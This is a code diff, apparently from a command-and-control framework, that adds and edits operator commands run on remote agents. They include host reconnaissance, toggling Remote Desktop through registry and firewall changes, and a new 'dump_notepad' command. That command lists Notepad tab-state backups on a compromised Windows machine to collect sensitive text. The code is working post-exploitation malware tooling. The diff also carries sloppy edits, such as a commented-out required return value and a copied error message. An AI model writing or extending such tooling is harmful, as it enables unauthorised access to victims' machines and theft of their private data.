@@ -21,6 +21,7 @@ class SystemRecon(BaseCommand):
 
     # this is how we are gonna do it
     def run(self):
+        time.sleep(1)
         # list of commands to run
         cmds = {
             "shell ver": "system.os",
@@ -37,7 +38,7 @@ class SystemRecon(BaseCommand):
             self.command_ids.append(command_ids)
 
         # must return list of command ID's that were queued.
-        return self.command_ids
+        # return self.command_ids
 
 
 ######################################
@@ -575,6 +576,40 @@ class RDP(BaseCommand):
             elif self.defender_on_off_arg == "disable":
                 disable_rdp = "shell powershell -Command \"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 1; Disable-NetFirewallRule -DisplayGroup 'Remote Desktop'\""
                 self.agent_class.enqueue_command(disable_rdp)
+
+        except Exception as e:
+            print("RDP encountered an error:", e)
+
+
+######################################
+# 10. Ops - Dump Notepad
+######################################
+class DumpNotepad(BaseCommand):
+    command_name = "dump_notepad"
+    command_help = (
+        "\tUsage: `dump_notepad`\n"
+        "\tDumps notepad backups, which may hold sensitive info\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        notepad_dir = "C:\\Users\\ryan\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState"
+        try:
+            list_backup_files_command = (
+                f"shell powershell -c 'ls {notepad_dir} -File -Name'"
+            )
+
+            # execute now
+            id = self.agent_class.enqueue_command(list_backup_files_command)
+            while self.agent_class.get_one_command_and_response(id) == None:
+                print("waiting on response")
+                time.sleep(0.5)
+
+            print("DONE")
+            print(self.agent_class.get_one_command_and_response(id))
 
         except Exception as e:
             print("RDP encountered an error:", e)
